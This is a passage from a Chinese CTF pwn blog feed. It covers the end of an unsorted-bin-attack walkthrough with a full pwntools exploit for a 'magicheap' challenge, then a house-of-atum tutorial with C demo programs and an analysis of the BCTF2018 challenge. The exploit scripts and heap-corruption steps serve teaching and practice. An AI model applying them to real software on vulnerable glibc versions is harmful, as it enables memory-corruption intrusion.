class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>这时我们再释放<code>chunk1</code>，<code>chunk1</code>就会被放入<code>unsortedbin</code>中。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327204808494.png" alt="image-20250327204808494"></p><ul><li>这时我们就要通过溢出操作修改<code>chunk1</code>的<code>bk</code>指针，在溢出的时候要注意一点就是要保持<code>chunk1</code>的<code>size</code>位不变，即size为一定要为<code>0x121</code>。否则我们再次申请堆块的时候<code>size</code>不正确可能就会导致程序崩溃。</li><li>接下来我们修改后再使用<code>malloc(0x110)</code>大小的堆块，修改完后的堆块内容如下图。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x121</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6020C0</span>-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327205749397.png" alt="image-20250327205749397"></p><ul><li>之后我们再次申请堆块，申请堆块后我们再查看<code>magic</code>这个全局变量的值，这时我们发现<code>magic</code>的值已经非常大了。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327210010119.png" alt="image-20250327210010119"></p><ul><li>之后我们再选择<code>4869</code>，这样我们就可以执行<code>cat flag</code>的命令了。我们就得到<code>flag</code>了</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327210135180.png" alt="image-20250327210135180"></p><h2 id="level_1_exp"><a href="#level-1-exp" class="headerlink" title="level_1_exp"></a>level_1_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x121</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6020C0</span>-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4869&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：正式学习unsorted_bin_attack的利用</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-atum</title>
    <link href="http://iyheart.github.io/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/"/>
    <id>http://iyheart.github.io/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/</id>
    <published>2025-03-25T06:23:51.000Z</published>
    <updated>2025-03-26T14:01:02.433Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：<a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#211-house-of-atum">Glibc堆利用之house of系列总结 - roderick - record and learn!</a></li><li>参考博客：<a href="https://ywhkkx.github.io/2023/03/10/House Of Atum-原理/">House Of Atum-原理 | Pwn进你的心</a></li><li>参考博客：<a href="https://bbs.kanxue.com/thread-269105.htm">原创]BCTF 2018 House of Atum分析-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></li></ul><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li>在<code>glibc2.31</code>版本之前，<code>tcache</code>的检查机制比较不太严格，在<code>glibc2.31</code>的时候才出现了<code>key</code>机制，所以在<code>glibc2.31</code>之前，实现<code>tcache double free</code>利用是非常容易的。甚至我们还可以把同一个<code>chunk</code>连续释放<code>8</code>次，第<code>8</code>次释放就会将该<code>chunk</code>放入<code>fastbin</code>中，当然此时该<code>chunk</code>本身还存留在<code>tcache</code>中。</li><li>这时我们甚至可以利用<code>UAF</code>漏洞，连续释放同一个<code>chunk</code>8次，使得该<code>chunk</code>被放入<code>fastbin</code>中，该<code>chunk</code>被放入<code>fastbin</code>的同时本身还是留在<code>tcache_bin</code>中。</li><li><code>house of atum</code>的适用范围：<code>glibc2.26——glibc2.30</code>。</li><li><p><code>house of atum</code>利用的前提条件：</p><ul><li>需要在<code>glibc</code>对应版本中。</li><li>需要存在<code>UAF</code>漏洞，这里的<code>UAF</code>漏洞需要满足两点，其一是：可以进行<code>double free</code>利用；其二是：<code>edit after free</code>，即该堆块被释放后还可以向这个堆块写入内容。</li></ul></li><li><p>进行<code>house of atum</code>这个利用方式之前，我们先要了解<code>tcache_bin</code>中的运行机制，而<code>tcache_bin</code>这个运行机制就不在这里多说明了，已经单独写一篇博客了。</p></li><li>其实最好是先学习一下<code>tcache double free</code>这个理由再来学习这个，但是问题不大。</li></ul><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h2><ul><li>这个利用方式在<code>how2heap</code>这个仓库中没有理由的代码，这时我们就自己写一个程序来动态调试一下程序的运行情况。</li><li>该程序的编译的<code>gcc</code>版本为<code>gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0</code>，但是由于我使用的<code>docker</code>环境中，<code>glibc2.27</code>已经打了补丁，所以我将该编译好的程序复制到<code>WSL</code>中，然后使用<code>glibc-all-in-one</code>这个项目，配合<code>patchelf</code>，这样就能得到实验的环境。</li><li>实验的源码如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>patchelf</code>完之后就可以开始进行动态调试了。我们就先申请一个堆块。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325165742613.png" alt="image-20250325165742613"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325165936179.png" alt="image-20250325165936179"></p><ul><li>然后我们先释放一次堆块，我们所申请的堆块就被放入了</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325170006658.png" alt="image-20250325170006658"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325170129245.png" alt="image-20250325170129245"></p><ul><li>这时我们再释放<code>6</code>次这个堆块，这时我们<code>tcachebins</code>中存放<code>0x20</code>大小的堆块就会被放满一样的堆块，这时我们再释放一个堆块，这个堆块就会被放入<code>fastbin</code>中。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325170231320.png" alt="image-20250325170231320"></p><ul><li>现在我们第<code>8</code>次释放堆块，查看<code>bins</code>的状态，此时这个<code>chunk</code>的<code>fd</code>指针已经被置<code>0</code>，并且该堆块除了已经放入到<code>tcachebin</code>中，也会被放入到<code>tcachebin</code>中。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325170415527.png" alt="image-20250325170415527"></p><h2 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h2><ul><li>接下来我们一步一步完善我们的利用方式。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line"></span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">free</span>(ptr1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    *ptr2 = (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)ptr1<span class="number">-0x10</span><span class="number">-0x10</span>;</span><br><span class="line">    ptr3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这时我们将这个代码编译后<code>patchelf</code>，进行调试并且画图理解。我们先来查看堆块释放<code>7</code>次，将<code>tcachebin</code>填满之后就会出现如下图所示。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221011601.png" alt="image-20250325221011601"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221127719.png" alt="image-20250325221127719"></p><ul><li>然后当我们再释放一次堆块，此时<code>tcachebin</code>对应存储着<code>0x20</code>的<code>size</code>已经被填满了，这时这个堆块就会被放入<code>fastbin</code>中，如下图所示，并且此时该<code>堆块</code>的<code>fd</code>指针会被设置为<code>0</code></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221322784.png" alt="image-20250325221322784"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221635647.png" alt="image-20250325221635647"></p><ul><li>这时我们再申请与之前释放的相同大小的堆块，此时就会从<code>tcachebin</code>中去取空闲的堆块。取完之后，<code>tcachebin</code>这个数组元素的值就会被设置为<code>0</code>，但是<code>tcachebins</code>有一个<code>count</code>标志用于表明该<code>tcachebin</code>中存放空闲chunk的数量，但是这时<code>tcachebin</code>相当于没有空闲的堆块。</li><li>但是我们看到<code>fastbin</code>数组中还有空闲的堆块。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221723067.png" alt="image-20250325221723067"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222007942.png" alt="image-20250325222007942"></p><ul><li>这时我们修改我们申请过来的堆块的<code>fd</code>指针，将该指针的值设置为<code>chunk_pre_size_addr - 0x10</code>如下图所示。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222439711.png" alt="image-20250325222439711"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222409026.png" alt="image-20250325222409026"></p><ul><li>这时我们申请一个堆块，此时我们还会申请到<code>0x55731847a250</code>这个位置，但是<code>0x55731847a240</code>会被链到<code>tcachebin</code>链表上，这样我们</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222617597.png" alt="image-20250325222617597"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222625783.png" alt="image-20250325222625783"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222749311.png" alt="image-20250325222749311"></p><ul><li>然后我们再次申请一个堆块，此时<code>malloc()</code>返回的地址对应的就会是<code>fake_fd</code>这边，对应着我们前面两次申请的堆块的<code>prev_size_addr</code>，这时我们就可以通过这次申请过来的堆块写入数据，从而达到修改<code>chunk</code>的<code>prev_size</code>、和<code>chunk</code>的<code>size</code>、<code>P</code>、<code>N</code>、<code>M</code>这三个标志位。从而进行后续的利用操作。</li></ul><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><ul><li>利用条件：<ul><li>需要存在<code>UAF</code>漏洞，并且可以使用<code>tcachebin double free</code>。</li><li>需要泄露堆的地址。</li><li>需要泄露</li></ul></li></ul><ul><li>申请 <code>chunk A</code>，大小在 <code>fastbin</code> 范围内</li><li>释放 <code>A</code>，连续释放 <code>8</code> 次，此时，<code>A</code> 的 <code>fd</code> 被清 <code>0</code>，<code>A</code> 也被放置到了 <code>fastbin</code> 里面</li><li>申请一个 <code>chunk</code>，将其 <code>fd</code> 修改为 <code>A - 0x10</code>，此时 <code>tcache</code> 中的 <code>counts</code> 为 <code>6</code></li><li>再申请一个 <code>chunk</code>，从 <code>fastbin</code> 里面取，但是会把 <code>fastbin</code> 里面剩余的一个 <code>chunk</code> 链入到 <code>tcachebin</code></li><li>再次分配就会分配到地址 <code>A-0x10</code> 处，就可以修改原来 <code>A</code> 的 <code>presize/size</code> 等</li></ul><h1 id="house-of-atum_level_1"><a href="#house-of-atum-level-1" class="headerlink" title="house of atum_level_1"></a>house of atum_level_1</h1><ul><li>题目来源：BCTF2018-house-of-atum</li><li>题目附件：搜索一下就能找到</li><li>涉及知识点：<code>house of atum</code>、<code>tcachebin下触发unlink</code>、<code>unsortedbin泄露libc地址</code>、<code>tcachebin_UAF申请任意地址</code>、<code>简单的__free_hook的利用</code>，总的来说也是一套组合利用，由于<code>tcachebin下触发unlink</code>、<code>unsortedbin_attack</code>这两个利用还没怎么了解，所以利用完<code>house of atum</code>就卡住了。</li><li>拿到附件之后我们需要使用<code>glibc-all-in-one</code>项目对应的<code>glibc2.27</code>版本进行patchelf，这样该程序才能正常运行。</li></ul><h2 id="level_1分析1"><a href="#level-1分析1" class="headerlink" title="level_1分析1"></a>level_1分析1</h2><ul><li>我们先运行一下这个程序看一下这个程序的基本运行逻辑。我们运行一下这个程序发现一开始就会弹出一个菜单。基本上就是<code>增、删、改、查</code>这一字面意思。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230209439.png" alt="image-20250325230209439"></p><ul><li>然后我们就输入选择，我们选择<code>1</code>后，程序会要求用户输入内容。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230346252.png" alt="image-20250325230346252"></p><ul><li>然后我们再选择<code>2</code>看看，我们选择<code>2</code>后，程序会要求我们输入要内容对应堆块的索引值<code>idx</code>，之后让我们输入新的内容。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230426716.png" alt="image-20250325230426716"></p><ul><li>我们先来选择第<code>4</code>个选项，发现程序要求我们输入索引，输入后会输出对应索引的堆块。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230527849.png" alt="image-20250325230527849"></p><ul><li>最后我们选择第<code>3</code>个选项，发现就是清除用户指定索引的堆块。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230621784.png" alt="image-20250325230621784"></p><ul><li>运行完一遍程序后我们就可以查看一下这个程序的保护机制了，发现保护全开。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326174311561.png" alt="image-20250326174311561"></p><ul><li>大致了解程序的运行逻辑之后，我们就使用<code>IDA</code>对这个程序进行逆向一下。结合之前我们运行的程序，我们大致可以分析出<code>main</code>函数其实就是一个类似于菜单的。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230802541.png" alt="image-20250325230802541"></p><ul><li>查看一下<code>initialize()</code>函数，我们发现这个函数其实就是一个输入、输出初始化的一个函数。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230933133.png" alt="image-20250325230933133"></p><ul><li>查看一下<code>menu()</code>这个函数，这个函数会输出菜单，输出菜单后还会调用<code>getint()</code></li><li>而<code>getint()</code>这个函数实现的功能就是字面意思，也就是获取用户的<code>选项输入</code>。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230956216.png" alt="image-20250325230956216"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325231054654.png" alt="image-20250325231054654"></p><ul><li>接下来就是看按照<code>增</code>、<code>删</code>、<code>改</code>、<code>看</code>这个顺序查看一下菜单对应的各个函数。</li><li>先查看<code>alloc()</code>函数<ul><li>该函数首先会遍历一下<code>已经申请并且存放在notes数组中的堆块个数</code>，我们会发现<code>notes</code>这个是一个全局变量，并且是指针数组类型。</li><li>如果已经有两个堆块了，就会告诉用户<code>太多notes</code>，并且不能再申请堆块了</li><li>如果还没有申请两个堆块，程序接下去就会申请一个<code>0x48</code>大小的堆块。</li><li>并且让用户向里面输入内容。</li></ul></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325231216793.png" alt="image-20250325231216793"></p><ul><li>接下来查看<code>改</code>即（<code>delete()</code>这个函数），主要就是让用户输入对应的<code>notes</code>数组的索引，然后直接释放对应索引的堆块。</li><li>程序会提示是否要清除堆块，如果输入<code>y</code>就会将<code>notes</code>对应的索引的元素设置为<code>0</code>。<strong>注意这里就存在UAF漏洞，我们可以选择不clear对应索引的堆块</strong></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325231737109.png" alt="image-20250325231737109"></p><ul><li>之后查看<code>edit</code>这个函数，这个函数就先会让用户输入对应的<code>idx</code>，然后向对应的堆块输入新的内容。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325232057571.png" alt="image-20250325232057571"></p><ul><li>最后再查看<code>show()</code>，这个函数就是输出对应堆块的内容。<strong>注意这个函数可以配合UAF漏洞使用，从而泄露出堆的地址</strong></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325232206338.png" alt="image-20250325232206338"></p><ul><li>程序分析完之后我们再来查看一下全局变量，看看是否有全局变量被我们遗漏的。发现并没有全局变量被我遗漏的。只有一个<code>notes</code>这个全局变量。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325234241046.png" alt="image-20250325234241046"></p><h2 id="level_1分析2"><a href="#level-1分析2" class="headerlink" title="level_1分析2"></a>level_1分析2</h2><ul><li>接下来我们进行动态调试，查看一下程序的基本逻辑，我们先写好基本的交互脚本。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span 